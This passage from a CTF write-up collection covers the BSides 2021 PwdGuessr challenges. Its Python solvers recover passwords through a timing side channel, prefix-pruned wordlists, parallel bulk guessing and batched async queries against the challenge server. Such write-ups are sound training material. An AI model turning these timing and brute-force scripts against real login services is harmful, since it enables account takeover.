= guess_words_smart ( elements , s ) log . info ( f \"Partial: { s !r} \" ) s = guess_words_smart ( nato_phonetic , s ) log . info ( f \"Partial: { s !r} \" ) brute ( s ) except SuccessfulConnection as e : print ( \"We're in!\" ) out = r . recvall ( 0.1 ) msg = e . args [ 0 ] + out . decode () print ( f \"User: { user } \" ) print ( msg ) finally : r . close () if __name__ == \"__main__\" : main () pwdguessrlists.py \u00b6 days = [ \"monday\" , \"tuesday\" , \"wednesday\" , \"thursday\" , \"friday\" , \"saturday\" , \"sunday\" ] movies = [ \"harrypotterandthechamberofsecrets\" , \"harrypotterandthedeathlyhallowspartone\" , \"harrypotterandthedeathlyhallowsparttwo\" , \"harrypotterandthegobletoffire\" , \"harrypotterandthegobletoffire\" , \"harrypotterandthehalfbloodprince\" , \"harrypotterandtheorderofthephoenix\" , \"harrypotterandthephilosophersstone\" , \"harrypotterandtheprisonerofazkaban\" , \"harrypotterandtheprisonerofazkaban\" , \"episodeeightthelastjedi\" , \"episodefivetheempirestrikesback\" , \"episodefouranewhope\" , \"episodeninetheriseofskywalker\" , \"episodeonethephantommenace\" , \"episodeseventheforceawakens\" , \"episodesixreturnofthejedi\" , \"episodethreerevengeofthesith\" , \"episodetwoattackoftheclones\" , ] starwars_episodes = [ \"eightthelastjedi\" , \"fivetheempirestrikesback\" , \"fouranewhope\" , \"ninetheriseofskywalker\" , \"onethephantommenace\" , \"seventheforceawakens\" , \"sixreturnofthejedi\" , \"threerevengeofthesith\" , \"twoattackoftheclones\" , ] potter_movies = [ \"chamberofsecrets\" , \"deathlyhallowspartone\" , \"deathlyhallowsparttwo\" , \"gobletoffire\" , \"halfbloodprince\" , \"orderofthephoenix\" , \"philosophersstone\" , \"prisonerofazkaban\" , ] elements = [ \"actinium\" , \"aluminium\" , \"aluminum\" , \"americium\" , \"antimony\" , \"argon\" , \"arsenic\" , \"astatine\" , \"barium\" , \"berkelium\" , \"beryllium\" , \"bismuth\" , \"bohrium\" , \"boron\" , \"bromine\" , \"cadmium\" , \"calcium\" , \"californium\" , \"carbon\" , \"cerium\" , \"caesium\" , \"chlorine\" , \"chromium\" , \"cobalt\" , \"copernicium\" , \"copper\" , \"curium\" , \"darmstadtium\" , \"dubnium\" , \"dysprosium\" , \"einsteinium\" , \"erbium\" , \"europium\" , \"fermium\" , \"flerovium\" , \"fluorine\" , \"francium\" , \"gadolinium\" , \"gallium\" , \"germanium\" , \"gold\" , \"hafnium\" , \"hassium\" , \"helium\" , \"holmium\" , \"hydrogen\" , \"indium\" , \"iodine\" , \"iridium\" , \"iron\" , \"krypton\" , \"lanthanum\" , \"lawrencium\" , \"lead\" , \"lithium\" , \"livermorium\" , \"lutetium\" , \"magnesium\" , \"manganese\" , \"meitnerium\" , \"mendelevium\" , \"mercury\" , \"molybdenum\" , \"moscovium\" , \"neodymium\" , \"neon\" , \"neptunium\" , \"nickel\" , \"nihonium\" , \"niobium\" , \"nitrogen\" , \"nobelium\" , \"oganesson\" , \"osmium\" , \"oxygen\" , \"palladium\" , \"phosphorus\" , \"platinum\" , \"plutonium\" , \"polonium\" , \"potassium\" , \"praseodymium\" , \"promethium\" , \"protactinium\" , \"radium\" , \"radon\" , \"rhenium\" , \"rhodium\" , \"roentgenium\" , \"rubidium\" , \"ruthenium\" , \"rutherfordium\" , \"samarium\" , \"scandium\" , \"seaborgium\" , \"selenium\" , \"silicon\" , \"silver\" , \"sodium\" , \"strontium\" , \"sulfur\" , \"tantalum\" , \"technetium\" , \"tellurium\" , \"tennessine\" , \"terbium\" , \"thallium\" , \"thorium\" , \"thulium\" , \"tin\" , \"titanium\" , \"tungsten\" , \"uranium\" , \"vanadium\" , \"wolfram\" , \"xenon\" , \"ytterbium\" , \"yttrium\" , \"zinc\" , \"zirconium\" , ] nato_phonetic = [ \"alfa\" , \"bravo\" , \"charlie\" , \"delta\" , \"echo\" , \"foxtrot\" , \"golf\" , \"hotel\" , \"india\" , \"juliett\" , \"kilo\" , \"lima\" , \"mike\" , \"november\" , \"oscar\" , \"papa\" , \"quebec\" , \"romeo\" , \"sierra\" , \"tango\" , \"uniform\" , \"victor\" , \"whiskey\" , \"xray\" , \"yankee\" , \"zulu\" , ]","title":"PwdGuessr 1"},{"location":"writeups/BSides-CTF-2021/pwdguessr1/#challenge-description","text":"To guess at things randomly is not to guess at all. Only through being methodical can enlightenment be achieved Note : This challenge has a second part which is a trophy challenge. You must be the first verified team to submit PwdGuessr2 to win the trophy. We have learned that the Demon-tron server has very particular requirements for their users' passwords. We have also managed to learn how those passwords are checked: def check_pwd ( sample , pwd ): for s , p in zip_longest ( sample , pwd ): if s is None or p is None : return False if p != s : time . sleep ( 0.5 ) # Add a delay to stop password-guessing attacks return False return True nc $target_dns $target_port","title":"Challenge Description"},{"location":"writeups/BSides-CTF-2021/pwdguessr1/#play-along-at-home","text":"During the CTF, the challenge was hosted at pwdguessr.chal.cybears.io:2323 To play after the CTF, run docker run --name pwdguessr1 -dp 2323 :2323 --rm registry.gitlab.com/cybears/fall-of-cybeartron/misc-pwdguessr and then change the host in the scripts to 127.0.0.1","title":"Play Along at Home"},{"location":"writeups/BSides-CTF-2021/pwdguessr1/#walkthrough","text":"","title":"Walkthrough"},{"location":"writeups/BSides-CTF-2021/pwdguessr1/#initial-recon","text":"From the definition of check_pwd given in the challenge description, it appears that when submitting a password there are three possible outcomes: Success - If we get the password entirely correct Delayed Failure - If the attempted password is not a prefix of the real password, there will be a 500ms delay Immediate Failure - If the attempted password is a prefix of the real password, it will return immediately Connecting to the challenge with nc pwdguessr.chal.cybears.io 2323 shows the prompt Welcome, user 5909559. Please enter your password: The initial welcome user with ID changes on each connection, this hints at something we discover later which is that every connection the password changes. Entering a random password lead to a brief pause, followed by the response Sorry, that password was incorrect. Please enter your password: Note The response does not end with a newline, so recvline will not work while scripting this","title":"Initial Recon"},{"location":"writeups/BSides-CTF-2021/pwdguessr1/#bruteforce","text":"To get a better idea of the passwords, a script was written to iteratively bruteforce character by character, continuing whenever an attempted password does not cause a 500ms delay. Note Script requires pwntools for providing a nice wrapper around the socket and tqdm for progress bars After a bit of iterating on the script due to realizing a timeout occurred after a while, it looked like import string from pwn import * from tqdm import tqdm alphabet = string . ascii_lowercase + string . digits + string . ascii_uppercase host = \"pwdguessr.chal.cybears.io\" port = 2323 r = remote ( host , port ) user_line = r . recvline () . decode () user = user_line . split ( \" \" )[ - 1 ][: - 2 ] r . recvuntil ( \"Please enter your password: \" ) class SuccessfulConnection ( Exception ): pass class Timeout ( Exception ): pass class NotFound ( Exception ): pass def check ( password ): before = time . time () r . sendline ( password ) out = r . recv ( 5 ) if out != b \"Sorry\" : if out == b \"Conne\" : raise Timeout raise SuccessfulConnection ( out . decode ()) after = time . time () r . recvuntil ( \"Please enter your password: \" ) delta = after - before return delta < 0.5 def main ( password : str = \"\" ): log . setLevel ( \"DEBUG\" ) while True : for c in tqdm ( alphabet ): if check ( password + c ): password += c log . debug ( f \"password= { password } \" ) break else : raise NotFound ( password ) if __name__ == '__main__' : main () Running this a couple of times, yielded a few prefixes before failing thurs sunda monda","title":"Bruteforce"},{"location":"writeups/BSides-CTF-2021/pwdguessr1/#wordlists","text":"Due to the prefixes appearing to be days of the week, the script was adapted to try these first import string from pwn import * from tqdm import tqdm alphabet = string . ascii_lowercase + string . digits + string . ascii_uppercase host = \"pwdguessr.chal.cybears.io\" port = 2323 r = remote ( host , port ) user_line = r . recvline () . decode () user = user_line . split ( \" \" )[ - 1 ][: - 2 ] r . recvuntil ( \"Please enter your password: \" ) days = [ \"monday\" , \"tuesday\" , \"wednesday\" , \"thursday\" , \"friday\" , \"saturday\" , \"sunday\" ] class SuccessfulConnection ( Exception ): pass class Timeout ( Exception ): pass class NotFound ( Exception ): pass def check ( password : str ): before = time . time () r . sendline ( password ) out = r . recv ( 5 ) if out != b \"Sorry\" : if out == b \"Conne\" : raise Timeout raise SuccessfulConnection ( out . decode ()) after = time . time () r . recvuntil ( \"Please enter your password: \" ) delta = after - before return delta < 0.5 def brute ( password : str = \"\" ): while True : for c in tqdm ( alphabet ): if check ( password + c ): password += c log . debug ( f \"password= { password } \" ) break else : raise NotFound ( password ) def guess_days ( password : str = \"\" ): for day in days : test = password + day log . debug ( f \"Checking: { test } \" ) if check ( test ): return test else : log . warn ( \"Falling back to bruteforce\" ) return brute ( password ) def main (): log . setLevel ( \"DEBUG\" ) password = guess_days () password = brute ( password ) if __name__ == '__main__' : main () Running this discovered more of the prefix, specifically that the passwords began with a day of the week followed by either episode or harry . To accomodate the multiple wordlists, guess_days was refactored into a guess_words function # SNIP def guess_words ( words : List [ str ], password : str = \"\" , fallback = True ): for word in words : test = password + word log . debug ( f \"Checking: { test } \" ) if check ( test ): log . debug ( f \"Found: { test } \" ) return test else : if fallback : log . warn ( f \"Failed to use password from { words } \" ) log . warn ( \"Falling back to bruteforce\" ) return brute ( s ) else : return None def main (): log . setLevel ( \"DEBUG\" ) password = guess_words ( days ) password = guess_words ([ \"episode\" , \"harry\" ]) password = brute ( password ) # SNIP This revealed that the second segment of the password was either of the form harrypotterandthe (name of harry potter movie with no spaces) or episodeonetheph (or any of the 9 Starwars movies) Adapting the script def main (): log . setLevel ( \"DEBUG\" ) password = guess_words ( days ) password = guess_words ([ \"episode\" , \"harrypotterandthe\" ]) if password . endswith ( \"episode\" ): s = guess_words ( starwars_episodes , password ) elif password . endswith ( \"harrypotterandthe\" ): s = guess_words ( potter_movies , password ) password = brute ( password ) Note I've skipped over a fair amount of trial and error while tweaking the wordlists to get the correct movie names","title":"Wordlists"},{"location":"writeups/BSides-CTF-2021/pwdguessr1/#optimisation-guess-prefixes","text":"At this point, I decided to slightly optimize my guesses so that I could Simplify my wordlists Reduce number of guesses prior to bruteforce, so I get more info before timing out I noticed that when guessing from a wordlist, some words had common prefixes, which could be guessed independently. from collections import Counter # SNIP def guess_words_smart ( words , password : str = \"\" ): # Don't bother with divide and conquer for two passwords if len ( words ) <= 2 : return guess_words ( words , password ) # Get most common first letters first_letters = Counter ( word [ 0 ] for word in words ) . most_common () if first_letters [ 0 ][ 1 ] == 1 : # If no common first letters just revert to guessing words return guess_words ( words , password ) # List of letters that have more than one word in list starting with them, ordered by first_letters_s = [ letter for letter , cnt in first_letters if cnt > 1 ] new_s = guess_words ( first_letters_s , password ) if new_s is None : new_words = [ word for word in words if word [ 0 ] not in first_letters_s ] assert len ( new_words ) > 0 return guess_words_smart ( new_words , password ) words = [ word [ 1 :] for word in words if word [ 0 ] == new_s [ - 1 ]] return guess_words_smart ( words , new_s ) With this optimisation, I could join the starwars episodes and harry potter movies wordlists without sacrificing performance. def main (): log . setLevel ( \"DEBUG\" ) password = guess_words_smart ( days ) password = guess_words_smart ( movies , password ) brute ( password )","title":"Optimisation - Guess Prefixes"},{"location":"writeups/BSides-CTF-2021/pwdguessr1/#more-wordlists","text":"With the optimisation out of the way, was able to bruteforce more of the next section of the password. After a few prefixes were recovered, I recognised they were elements of the periodic table and added that as a wordlist def main (): log . setLevel ( \"DEBUG\" ) password = guess_words_smart ( days ) password = guess_words_smart ( movies , password ) password = guess_words_smart ( elements , password ) brute ( password ) Note What I did not realize at this point was that a few elements were spelled differently in the periodic table I used as a reference. This was uncovered during PwdGuessr 2 , but caused unexplained failure in ~4% of attempts.","title":"More Wordlists"},{"location":"writeups/BSides-CTF-2021/pwdguessr1/#even-more-wordlists","text":"Running the script a few more times revealed that the next (and last) part of the password were words from the Nato phonetic alphabet. After adding the nato word list, running the script gave the file","title":"Even More Wordlists"},{"location":"writeups/BSides-CTF-2021/pwdguessr1/#full-source","text":"","title":"Full Source"},{"location":"writeups/BSides-CTF-2021/pwdguessr1/#pwdguessrpy","text":"from pwn import * from tqdm import tqdm from collections import Counter from pwdguessrlists import ( elements , days , nato_phonetic , movies , ) # host = \"pwdguessr.chal.cybears.io\" host = \"127.0.0.1\" port = 2323 alphabet = string . ascii_lowercase r = remote ( host , port ) user_line = r . recvline () . decode () user = user_line . split ( \" \" )[ - 1 ][: - 2 ] print ( r . recvuntil ( \"Please enter your password: \" )) class SuccessfulConnection ( Exception ): pass class NotFound ( Exception ): pass class Timeout ( Exception ): pass def check ( x ): before = time . time () r . sendline ( x ) out = r . recv ( 5 ) if out != b \"Sorry\" : if out == b \"Conne\" : raise Timeout raise SuccessfulConnection ( out . decode ()) after = time . time () r . recvuntil ( \"Please enter your password: \" ) delta = after - before return delta < 0.5 def brute ( s : str = \"\" ): while True : for c in tqdm ( alphabet ): if check ( s + c ): s += c print ( f \"s= { s } \" ) break else : raise NotFound ( \"Brute\" ) def guess_words ( words , s : str = \"\" , fallback = True ): for word in words : test = s + word log . debug ( f \"Checking: { test } \" ) if check ( test ): return test else : if fallback : log . warn ( f \"Failed to use password from { words } \" ) log . warn ( \"Falling back to bruteforce\" ) return brute ( s ) else : return None def guess_words_smart ( words , s : str = \"\" ): # Napkin maths says 3 is a good number if len ( words ) < 3 : return guess_words ( words , s ) first_letters = Counter ( word [ 0 ] for word in words ) . most_common () if first_letters [ 0 ][ 1 ] == 1 : return guess_words ( words , s ) first_letters_s = [ letter for letter , cnt in first_letters if cnt > 1 ] new_s = guess_words ( first_letters_s , s , fallback = False ) if new_s is None : new_words = [ word for word in words if word [ 0 ] not in first_letters_s ] assert len ( new_words ) > 0 return guess_words_smart ( new_words , s ) words = [ word [ 1 :] for word in words if word [ 0 ] == new_s [ - 1 ]] return guess_words_smart ( words , new_s ) def main (): log . setLevel ( \"DEBUG\" ) try : s = guess_words_smart ( days ) log . info ( f \"Partial: { s !r} \" ) s = guess_words_smart ( movies , s ) log . info ( f \"Partial: { s !r} \" ) s = guess_words_smart ( elements , s ) log . info ( f \"Partial: { s !r} \" ) s = guess_words_smart ( nato_phonetic , s ) log . info ( f \"Partial: { s !r} \" ) brute ( s ) except SuccessfulConnection as e : print ( \"We're in!\" ) out = r . recvall ( 0.1 ) msg = e . args [ 0 ] + out . decode () print ( f \"User: { user } \" ) print ( msg ) finally : r . close () if __name__ == \"__main__\" : main ()","title":"pwdguessr.py"},{"location":"writeups/BSides-CTF-2021/pwdguessr1/#pwdguessrlistspy","text":"days = [ \"monday\" , \"tuesday\" , \"wednesday\" , \"thursday\" , \"friday\" , \"saturday\" , \"sunday\" ] movies = [ \"harrypotterandthechamberofsecrets\" , \"harrypotterandthedeathlyhallowspartone\" , \"harrypotterandthedeathlyhallowsparttwo\" , \"harrypotterandthegobletoffire\" , \"harrypotterandthegobletoffire\" , \"harrypotterandthehalfbloodprince\" , \"harrypotterandtheorderofthephoenix\" , \"harrypotterandthephilosophersstone\" , \"harrypotterandtheprisonerofazkaban\" , \"harrypotterandtheprisonerofazkaban\" , \"episodeeightthelastjedi\" , \"episodefivetheempirestrikesback\" , \"episodefouranewhope\" , \"episodeninetheriseofskywalker\" , \"episodeonethephantommenace\" , \"episodeseventheforceawakens\" , \"episodesixreturnofthejedi\" , \"episodethreerevengeofthesith\" , \"episodetwoattackoftheclones\" , ] starwars_episodes = [ \"eightthelastjedi\" , \"fivetheempirestrikesback\" , \"fouranewhope\" , \"ninetheriseofskywalker\" , \"onethephantommenace\" , \"seventheforceawakens\" , \"sixreturnofthejedi\" , \"threerevengeofthesith\" , \"twoattackoftheclones\" , ] potter_movies = [ \"chamberofsecrets\" , \"deathlyhallowspartone\" , \"deathlyhallowsparttwo\" , \"gobletoffire\" , \"halfbloodprince\" , \"orderofthephoenix\" , \"philosophersstone\" , \"prisonerofazkaban\" , ] elements = [ \"actinium\" , \"aluminium\" , \"aluminum\" , \"americium\" , \"antimony\" , \"argon\" , \"arsenic\" , \"astatine\" , \"barium\" , \"berkelium\" , \"beryllium\" , \"bismuth\" , \"bohrium\" , \"boron\" , \"bromine\" , \"cadmium\" , \"calcium\" , \"californium\" , \"carbon\" , \"cerium\" , \"caesium\" , \"chlorine\" , \"chromium\" , \"cobalt\" , \"copernicium\" , \"copper\" , \"curium\" , \"darmstadtium\" , \"dubnium\" , \"dysprosium\" , \"einsteinium\" , \"erbium\" , \"europium\" , \"fermium\" , \"flerovium\" , \"fluorine\" , \"francium\" , \"gadolinium\" , \"gallium\" , \"germanium\" , \"gold\" , \"hafnium\" , \"hassium\" , \"helium\" , \"holmium\" , \"hydrogen\" , \"indium\" , \"iodine\" , \"iridium\" , \"iron\" , \"krypton\" , \"lanthanum\" , \"lawrencium\" , \"lead\" , \"lithium\" , \"livermorium\" , \"lutetium\" , \"magnesium\" , \"manganese\" , \"meitnerium\" , \"mendelevium\" , \"mercury\" , \"molybdenum\" , \"moscovium\" , \"neodymium\" , \"neon\" , \"neptunium\" , \"nickel\" , \"nihonium\" , \"niobium\" , \"nitrogen\" , \"nobelium\" , \"oganesson\" , \"osmium\" , \"oxygen\" , \"palladium\" , \"phosphorus\" , \"platinum\" , \"plutonium\" , \"polonium\" , \"potassium\" , \"praseodymium\" , \"promethium\" , \"protactinium\" , \"radium\" , \"radon\" , \"rhenium\" , \"rhodium\" , \"roentgenium\" , \"rubidium\" , \"ruthenium\" , \"rutherfordium\" , \"samarium\" , \"scandium\" , \"seaborgium\" , \"selenium\" , \"silicon\" , \"silver\" , \"sodium\" , \"strontium\" , \"sulfur\" , \"tantalum\" , \"technetium\" , \"tellurium\" , \"tennessine\" , \"terbium\" , \"thallium\" , \"thorium\" , \"thulium\" , \"tin\" , \"titanium\" , \"tungsten\" , \"uranium\" , \"vanadium\" , \"wolfram\" , \"xenon\" , \"ytterbium\" , \"yttrium\" , \"zinc\" , \"zirconium\" , ] nato_phonetic = [ \"alfa\" , \"bravo\" , \"charlie\" , \"delta\" , \"echo\" , \"foxtrot\" , \"golf\" , \"hotel\" , \"india\" , \"juliett\" , \"kilo\" , \"lima\" , \"mike\" , \"november\" , \"oscar\" , \"papa\" , \"quebec\" , \"romeo\" , \"sierra\" , \"tango\" , \"uniform\" , \"victor\" , \"whiskey\" , \"xray\" , \"yankee\" , \"zulu\" , ]","title":"pwdguessrlists.py"},{"location":"writeups/BSides-CTF-2021/pwdguessr2/","text":"PwdGuessr 2 \u00b6 An interesting password guessing challenge \u00b6 title: PwdGuessr 2 description: The significantly harder part of a password guessing challenge tags: - writeups - ctf - polished - python Challenge Description \u00b6 To guess at things randomly is not to guess at all. Only through being methodical can enlightenment be achieved You round a bend in the road, and your party is set upon by bandits - an ambush! Fortunately, you've been praciticing your martial arts, and you take the opportunity to show off your latest moves. You kca-spank your way to a comprehensive victory, sending the bandits packing. As they run, one of them drops the device they use to coodinate their activities. If you can recover the credentials of enough bandits, you can make sure to avoid their attentions for the foreseeable future. nc $target_dns $target_port def check_pwd ( sample , pwd ): for s , p in zip_longest ( sample , pwd ): if s is None or p is None : return False if p != s : time . sleep ( 0.5 ) # Add a delay to stop password-guessing attacks return False return True nc $target_dns $target_port Play Along at Home \u00b6 During the CTF, the challenge was hosted at pwdguessr22222.chal.cybears.io:2323 To play after the CTF, run docker run --name pwdguessr2 -dp 2323 :2323 --rm registry.gitlab.com/cybears/fall-of-cybeartron/misc-pwdguessr2 and then change the host in the scripts to 127.0.0.1 Walkthrough \u00b6 Recap \u00b6 Last challenge we discovered that the passwords were chosen by concatenating four pieces of information: A day of the week A movie from Harry Potter or the Nine Starwars Movies An element of the Periodic Table A nato phonetic alphabet letter This means there are 7 * 19 * 120 * 26 = 414960 possible passwords Discovery \u00b6 This challenge was primarily an optimisation challenge, so largely was based off the original source with multiple refactors Connecting to the challenge with nc pwdguessr22222.chal.cybears.io 2323 gave the following banner: You need to prove your efficiency at password guessing. Send a single natural number to get that many IDs, each representing a password to guess. Send a comma separated list of ID:guess (up to 20 at a time) to get back a comma separated list of results. You still need to recover 200 passwords. You have 6000 incorrect guesses remaining. Which gives two useful bits of information If we wish to speed up out attempts, we can make up to 20 guesses at a time We need to guess 200 passwords with 6000 incorrect guesses, meaning we must average less than 30 incorrect guesses per user In the connection, sending a number gives user IDs which are UUIDs, which could then be used to guess For this challenge, rather than delaying the output for incorrect passwords, it returned either _ for partially correct, 1 for fully correct, and 0 for incorrect. This made it much faster. Theorising \u00b6 At first, I was uncertain whether there was a correlation between each segment of the password so I made a script to bulk solve challenge 1 and record the results in a CSV. To do this, I refactored my guesser into a class Guesser class Guesser : def __init__ ( self , host = HOST , port = PORT ): self . r = remote ( host , port ) self . host = host self . port = port user_line = self . r . recvline () . decode () self . user = user_line . split ( \" \" )[ - 1 ][: - 2 ] self . r . recvuntil ( \"Please enter your password: \" ) self . password = None self . guesses = 0 self . incorrect = 0 def check ( self , password ): log . debug ( f \"Checking: { password } \" ) self . guesses += 1 before = time . time () self . r . sendline ( password ) out = self . r . recv ( 5 ) if out != b \"Sorry\" : if out == b \"Conne\" : raise Timeout self . password = password raise SuccessfulConnection ( out . decode ()) after = time . time () self . r . recvuntil ( \"Please enter your password: \" ) delta = after - before if delta < 0.5 : self . password = password return True self . incorrect += 1 return False def brute_force ( self , password : str = \"\" ): log . warning ( f \"Brute forcing from: { password } \" ) while True : for c in tqdm ( ALPHABET ): if self . check ( password + c ): password += c log . debug ( f \"Partial: { password } \" ) break else : raise NotFound ( \"Brute\" ) def guess_words ( self , words , password : str = \"\" , fallback = True ): for word in words : test = password + word if self . check ( test ): return test else : if fallback : log . warn ( f \"Failed to use password from { words } \" ) log . warn ( \"Falling back to bruteforce\" ) return self . brute_force ( password ) else : return None def guess_words_smart ( self , words , password : str = \"\" ): # Napkin maths says 4 is a good number if len ( words ) < 4 : return self . guess_words ( words , password ) first_letters = Counter ( word [ 0 ] for word in words ) . most_common () if first_letters [ 0 ][ 1 ] == 1 : return self . guess_words ( words , password ) first_letters_s = [ letter for letter , cnt in first_letters if cnt > 1 ] new_s = self . guess_words ( first_letters_s , password , fallback = False ) if new_s is None : new_words = [ word for word in words if word [ 0 ] not in first_letters_s ] assert len ( new_words ) > 0 return self . guess_words_smart ( new_words , password ) words = [ word [ 1 :] for word in words if word [ 0 ] == new_s [ - 1 ]] return self . guess_words_smart ( words , new_s ) def solve ( self ): try : password = self . guess_words_smart ( days ) log . info ( f \"Partial: { password !r} \" ) password = self . guess_words_smart ( movies , password ) log . info ( f \"Partial: { password !r} \" ) password = self . guess_words_smart ( elements , password ) log . info ( f \"Partial: { password !r} \" ) password = self . guess_words_smart ( nato_phonetic , password ) log . info ( f \"Partial: { password !r} \" ) log . warning ( \"Something after phonetic alphabet, resorting to brute force\" ) self . brute_force ( password ) except SuccessfulConnection as e : log . info ( \"We're in!\" ) out = self . r . recvall ( 0.1 ) msg = e . args [ 0 ] + out . decode () log . info ( f \"Guesses: { self . guesses } \" ) log . info ( f \"User: { self . user } \" ) log . info ( f \"Password: { self . password } \" ) log . info ( f \"MSG: { msg } \" ) return True , self . guesses , self . password , self . user , self . incorrect except ( Timeout , EOFError , AssertionError ): return False , self . guesses , self . password , self . user , self . incorrect except Exception as e : log . exception ( e ) return False , self . guesses , self . password , self . user , self . incorrect finally : self . r . close () And wrote a bulk guesser script import multiprocessing from guesser import Guesser from pwn import * PARALLELISM = 50 SAMPLES = 200 def run_guess ( idx ): log . info ( f \"Starting { idx } \" ) try : guesser = Guesser () return guesser . solve () except : return None def main (): with multiprocessing . Pool ( PARALLELISM ) as p : results = p . map ( run_guess , range ( SAMPLES )) res_string = \" \\n \" . join ( \",\" . join ( str ( x ) for x in res ) for res in results if res is not None ) print ( res_string ) with open ( \"results.csv\" , \"a+\" ) as f : f . write ( res_string + \" \\n \" ) if __name__ == \"__main__\" : main () At this point, I discovered the various typos in my elements and nato alphabet (Removed a -) It appeared from looking at the data that was no correlation between the sections However this did also show that on average it was taking ~26.7 incorrected guesses per password which was within parameters. Solver \u00b6 I adapted the guesser to handle the user IDs which gave me, but just did one ID at a time from pwn import * from tqdm import tqdm from collections import Counter from pwdguessrlists import ( elements , movies , days , nato_phonetic , ) HOST = \"pwdguessr22222.chal.cybears.io\" PORT = 2323 ALPHABET = string . ascii_lowercase class SuccessfulConnection ( Exception ): pass class NotFound ( Exception ): pass class Timeout ( Exception ): pass class GuesserSecondary : def __init__ ( self , r ): self . r = r self . r . sendline ( \"1\" ) self . user = self . r . recvline () . decode () . strip () log . debug ( f \"user= { self . user !r} \" ) self . r . recvline () self . password = \"\" self . guesses = 0 def check ( self , password ): log . debug ( f \"Check: { password } \" ) self . guesses += 1 self . r . sendline ( f \" { self . user } : { password } \" ) out = self . r . recvline () . decode () self . r . recvline () if out [ 0 ] == \"0\" : return False if out [ 0 ] == \"_\" : self . password = password return True if out [ 0 ] == \"1\" : self . password = password raise SuccessfulConnection raise ValueError ( f \"Invalid Out: { out !r} \" ) def brute_force ( self , password : str = \"\" ): log . error ( f \"Brute forcing from: { password } \" ) while True : for c in tqdm ( ALPHABET ): if self . check ( password + c ): password += c log . debug ( f \"Partial: { password } \" ) break else : raise NotFound ( \"Brute\" ) def guess_words ( self , words , password : str = \"\" , fallback = True ): for word in words : test = password + word if self . check ( test ): return test else : if fallback : log . warn ( f \"Failed to use password from { words } \" ) log . warn ( \"Falling back to bruteforce\" ) return self . brute_force ( password ) else : return None def guess_words_smart ( self , words , password : str = \"\" ): # Napkin maths says 4 is a good number if len ( words ) < 4 : return self . guess_words ( words , password ) first_letters = Counter ( word [ 0 ] for word in words ) . most_common () if first_letters [ 0 ][ 1 ] == 1 : return self . guess_words ( words , password ) first_letters_s = [ letter for letter , cnt in first_letters if cnt > 1 ] new_s = self . guess_words ( first_letters_s , password , fallback = False ) if new_s is None : new_words = [ word for word in words if word [ 0 ] not in first_letters_s ] assert len ( new_words ) > 0 return self . guess_words_smart ( new_words , password ) words = [ word [ 1 :] for word in words if word [ 0 ] == new_s [ - 1 ]] return self . guess_words_smart ( words , new_s ) def solve ( self ): try : password = self . guess_words_smart ( days ) log . debug ( f \"Partial: { password !r} \" ) password = self . guess_words_smart ( movies , password ) log . debug ( f \"Partial: { password !r} \" ) password = self . guess_words_smart ( elements , password ) log . debug ( f \"Partial: { password !r} \" ) password = self . guess_words_smart ( nato_phonetic , password ) log . debug ( f \"Partial: { password !r} \" ) log . error ( \"Something after phonetic alphabet, resorting to brute force\" ) self . brute_force ( password ) except SuccessfulConnection : log . info ( \"We're in!\" ) out = self . r . recvuntil ( \"remaining. \\n \" , timeout = 1 ) log . info ( f \"MSG: { out } \" ) log . info ( f \"Guesses: { self . guesses } /6000 ( { round ( self . guesses / 60 , 2 ) } )\" ) log . info ( f \"User: { self . user } \" ) log . info ( f \"Password: { self . password } \" ) return True , self . guesses , self . password , self . user # except Timeout: # return False, self.guesses, self.password, self.user def main (): log . setLevel ( \"INFO\" ) r = remote ( HOST , PORT ) r . recvuntil ( \"remaining. \\n \" ) for i in tqdm ( range ( 201 )): guesser = GuesserSecondary ( r ) guesser . solve () if __name__ == \"__main__\" : main () Betrayal \u00b6 Running the script took 15 minutes, but after it reached 200, it didn't appear to exit like I'd expected. Conveniently I had been running Wireshark in the background so I saw what had occurred I'd received a \"flag\" of did_you_really_think_cybears{would_make_it_this_easy}? Followed by a banner like the original, but with an extra line at the end You need to prove even more efficiency at password guessing. Send a single natural number to get that many IDs, each representing a password to guess. Send a comma separated list of ID:guess (up to {} at a time) to get back a comma separated list of results. This time, you're given the length of each password alongside its ID. This meant that I had to repeat the 200 password part (which took 15) mins and then repeat, but this time using the known length of each password to reduce the incorrect attempts. Optimisation - Concurrency \u00b6 As waiting > 15 mins per attempt was impractical, (and I was still hopeful for first solve) I decided to bite the bullet and rewrite the guesser to guess 20 users at a time, with comma separated uid:password pairs. Dataloader \u00b6 The approach I took for writing this is inspired by https://github.com/graphql/dataloader in that a dataloader receives requests, and batches the requests once a condition is reached. This was the first time I've ever really had to use Future's in Python, but as they are similar to Promise's in javascript, the learning curve was fine. class Loader : def __init__ ( self , r : remote ): self . r = r self . total_guessers = 0 self . incorrect_guesses = 0 self . guessers = 0 self . futures = [] def add_guesser ( self ): self . guessers += 1 self . total_guessers += 1 def remove_guesser ( self ): self . guessers -= 1 if len ( self . futures ) == self . guessers and self . guessers > 0 : self . resolve_batch () def submit ( self , user : str , password : str , future : asyncio . Future ): self . futures . append (( user , password , future )) if len ( self . futures ) == self . guessers : self . resolve_batch () def resolve_batch ( self ): futures = self . futures self . futures = [] self . r . recvline ( timeout = 0.1 ) query = \",\" . join ( f \" { user } : { password } \" for ( user , password , future ) in futures ) self . r . sendline ( query ) result = self . r . recvline () . decode () . strip () results = result . split ( \",\" ) log . debug ( f \"Results: { results !r} \" ) for resp , ( user , password , future ) in zip ( results , futures ): log . debug ( f \"Resolved: ( { user =} , { password =} ) => { resp } \" ) if resp == \"0\" : self . incorrect_guesses += 1 future . set_result ( False ) elif resp == \"_\" : future . set_result ( True ) elif resp == \"1\" : future . set_exception ( SuccessfulConnection ( password )) This let me rewrite the check function to use promises, and added many async and awaits through the guesser class. class GuesserAsync : def __init__ ( self , loader : Loader , user : str ): self . loader = loader self . user = user log . debug ( f \"Init: user= { user !r} \" ) self . guesses = 0 self . loader . add_guesser () async def check ( self , password ): log . debug ( f \"Check: { password } \" ) loop = asyncio . get_running_loop () future = loop . create_future () self . loader . submit ( self . user , password , future ) return await future async def guess_words ( self , words , password : str = \"\" ): for word in words : test = password + word if await self . check ( test ): return test else : return None async def guess_words_smart ( self , words , password : str = \"\" ): # log.debug(f\"Partial: {self.password!r}\") # Napkin maths says 4 is a good number if len ( words ) < 3 : return await self . guess_words ( words , password ) first_letters = Counter ( word [ 0 ] for word in words ) . most_common () if first_letters [ 0 ][ 1 ] == 1 : return await self . guess_words ( words , password ) first_letters_s = [ letter for letter , cnt in first_letters if cnt > 1 ] new_s = await self . guess_words ( first_letters_s , password ) if new_s is None : new_words = [ word for word in words if word [ 0 ] not in first_letters_s ] assert len ( new_words ) > 0 return await self . guess_words_smart ( 